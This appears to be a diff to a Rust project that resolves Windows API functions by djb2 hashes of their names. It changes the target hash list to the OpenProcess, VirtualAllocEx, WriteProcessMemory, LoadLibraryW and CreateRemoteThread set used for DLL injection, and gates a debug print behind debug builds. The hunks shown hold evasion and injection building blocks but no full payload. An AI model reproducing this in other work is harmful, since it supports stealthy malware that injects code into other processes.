@@ -45,10 +45,13 @@ macro_rules! addr_to_func_ptr {
 lazy_static::lazy_static! {
     static ref TARGET_HASHES: Mutex<HashSet<u32>> = Mutex::new(
         HashSet::from([
-            djb2!("Process32FirstW"),
-                      djb2!("CreateToolhelp32Snapshot"),
-                      djb2!("HeapAlloc"),
-                      djb2!("MessageBoxW"),
+            djb2!("OpenProcess"),
+            djb2!("VirtualAllocEx"),
+            djb2!("LoadLibraryW"),
+            djb2!("WriteProcessMemory"),
+            djb2!("CreateRemoteThread"),
+            djb2!("MessageBoxW"),
+            djb2!("CloseHandle"),
         ])
     );
 
@@ -73,6 +76,7 @@ fn to_wstring(value: &str) -> Vec<u16> {
 // processing the forwarded module EAT.
 fn process_forwarded_export(forwarder: &str) -> Result<(), Box<dyn Error>> {
     println!("Processing forwarded export: {}", forwarder);
+
 
     // Parse out the destination DLL and API name
     let split: Vec<&str> = forwarder.split(".").collect();
@@ -373,6 +377,7 @@ pub fn get_hashed_api_addr(hash: &u32) -> Result<u64, Box<dyn Error>> {
 
 // Returns the function address for the given API hash, using the provided module
 pub fn resolve_api(hash: u32, module_name: &str) -> Result<u64, Box<dyn Error>> {
+    #[cfg(debug_assertions)]
     println!("Resolving API with hash {:x} from module {}", hash, module_name);
 
     // Check if we already resolved this API
